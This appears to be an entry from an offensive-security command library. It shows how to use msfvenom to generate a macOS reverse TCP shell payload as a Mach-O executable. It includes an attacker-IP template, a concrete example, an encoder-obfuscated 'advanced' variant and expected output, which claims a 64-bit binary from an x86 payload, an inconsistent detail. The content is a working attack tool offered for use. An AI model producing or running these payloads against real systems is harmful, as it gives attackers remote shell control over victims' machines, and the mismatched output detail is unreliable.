---
id: b963d3e4-6851-41b5-afc8-7456948cd92c
name: msfvenom-generate-osx-x86-shell-reverse-tcp-macho
type: command
executor: bash
data: >-
  msfvenom -p osx/x86/shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f macho
  > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275329+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - macOS
tags:
  - reverse-shell
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-osx-x86-shell-reverse-tcp-macho

## Command

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f macho > $_OUTPUT_FILE
```

## Description

This command generates a basic reverse TCP shell payload for macOS x86 in Mach-O format using msfvenom, providing shell access upon execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p osx/x86/shell_reverse_tcp | macOS x86 reverse shell payload | Yes |
| LHOST="$_LHOST" | Attacker IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f macho | Mach-O binary format | Yes |
| > $_OUTPUT_FILE | Output file (e.g., shell.macho) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
```

### Advanced Usage

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho -e x86/shikata_ga_nai > encoded_shell.macho
```

## Expected Output

Generates 'shell.macho'. Verify:

```bash
file shell.macho
shell.macho: Mach-O 64-bit executable x86_64
```

Size ~10 KB. Executes to connect back.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
